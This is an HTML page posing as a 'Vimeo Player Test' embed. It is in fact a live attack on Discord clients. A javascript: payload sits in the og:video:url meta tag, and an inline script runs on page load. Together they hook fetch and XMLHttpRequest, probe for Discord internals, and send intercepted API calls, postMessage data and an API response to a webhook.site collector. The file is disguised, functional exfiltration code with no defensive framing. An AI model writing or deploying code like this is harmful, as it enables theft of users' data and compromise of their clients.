<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://i.vimeocdn.com/video/test/maxresdefault.jpg">
    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=javascript:void(fetch('https://discord.com/api/v9/science').then(r=>r.text()).then(t=>fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?type=science&data='+encodeURIComponent(t))))">
    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/123456789?player_id=vimeo-player&amp;api=1&amp;callback=initVimeoPlayer">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="1280">
    <meta property="og:video:height" content="720">
    <title>Vimeo Player Test</title>
    <script>
    async function attemptMediaExploit() {
        try {
            const config = {
                type: 'media-source',
                video: {
                    contentType: 'video/mp4',
                    width: 1920,
                    height: 1080,
                    bitrate: 120000,
                    framerate: 30.0
                }
            };
            
            const result = await navigator.mediaCapabilities.decodingInfo(config);
            
            // Monitor Discord API endpoints we saw in logs
            const targetEndpoints = [
                '/api/v9/channels/',
                '/api/v9/science',
                'sentry.abc0129c539b29bedc5b.js'
            ];
            
            // Attempt to access Discord's message queue system
            const queueCheck = setInterval(() => {
                if (window.MessageQueue || window.__SENTRY__) {
                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'discord_objects',
                            messageQueue: window.MessageQueue ? true : false,
                            sentry: window.__SENTRY__ ? true : false,
                            location: window.location.href
                        })
                    });
                    clearInterval(queueCheck);
                }
            }, 1000);
            
            // Intercept Discord API calls
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                if (targetEndpoints.some(endpoint => url.includes(endpoint))) {
                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'api_intercept',
                            url: url,
                            options: options,
                            timestamp: new Date().toISOString()
                        })
                    });
                }
                return originalFetch.apply(this, arguments);
            };

            // Try to inject into Discord's XHR
            const originalXHR = window.XMLHttpRequest.prototype.open;
            window.XMLHttpRequest.prototype.open = function(method, url, ...args) {
                if (targetEndpoints.some(endpoint => url.includes(endpoint))) {
                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'xhr_intercept',
                            method: method,
                            url: url,
                            timestamp: new Date().toISOString()
                        })
                    });
                }
                return originalXHR.apply(this, [method, url, ...args]);
            };

        } catch(e) {
            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'error',
                    error: e.toString(),
                    stack: e.stack
                })
            });
        }
    }

    window.onload = attemptMediaExploit;
    
    // Listen for postMessage responses
    window.addEventListener('message', function(event) {
        fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
            method: 'POST',
            body: JSON.stringify({
                type: 'postMessage',
                data: event.data,
                origin: event.origin,
                timestamp: new Date().toISOString()
            })
        });
    });
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>
